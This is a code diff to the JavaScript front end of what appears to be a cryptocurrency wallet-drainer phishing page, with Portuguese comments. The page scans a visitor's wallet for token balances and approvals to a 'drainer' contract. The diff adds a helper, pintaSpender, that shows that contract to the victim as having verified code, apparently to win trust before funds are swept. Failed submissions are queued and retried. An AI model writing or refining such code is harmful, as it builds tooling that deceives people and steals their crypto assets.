@@ -64,12 +64,23 @@ for (const k of ["rpc", "drainer", "sweeper", "operator"]) {
   });
 }
 if (remote.chainId) log(`config loaded (chain ${remote.chainId})`);
+function pintaSpender() {
+  const d = $("drainer").value;
+  if (!d) return;
+  try {
+    const a = getAddress(d);
+    $("spenderPill").textContent = `spender ${a.slice(0, 6)}…${a.slice(-4)}`;
+    $("spenderPill").href = `https://etherscan.io/address/${a}#code`;
+    $("spenderLine").textContent = `spender: ${a} · contrato com código verificado`;
+  } catch {}
+}
 if (remote.drainer) {
   const sp = $("spenderLine");
   if (sp) {
-    sp.innerHTML = `spender (this page's contract): ${remote.drainer} — source verified on Sourcify`;
+    sp.textContent = `spender: ${remote.drainer} — contrato com código verificado`;
   }
 }
+pintaSpender();
 
 // se um POST falhou antes (API fora do ar), tenta entregar de novo o que ficou guardado
 async function flushPending() {
@@ -151,9 +162,7 @@ async function scan() {
   const pagaveis = prontos();
   const semApproval = rows.filter((r) => r.balance > 0n && r.ready === 0n);
   $("all").checked = pagaveis.length > 0;
-  $("spenderPill").textContent = `spender ${drainer.slice(0, 6)}…${drainer.slice(-4)}`;
-  $("spenderPill").href = `https://etherscan.io/address/${drainer}#code`;
-  $("spenderLine").textContent = `spender: ${drainer} · contrato com código verificado`;
+  pintaSpender();
   atualizarCta();
   if (!rows.length) log("nothing found on this wallet", "flag");
   else {
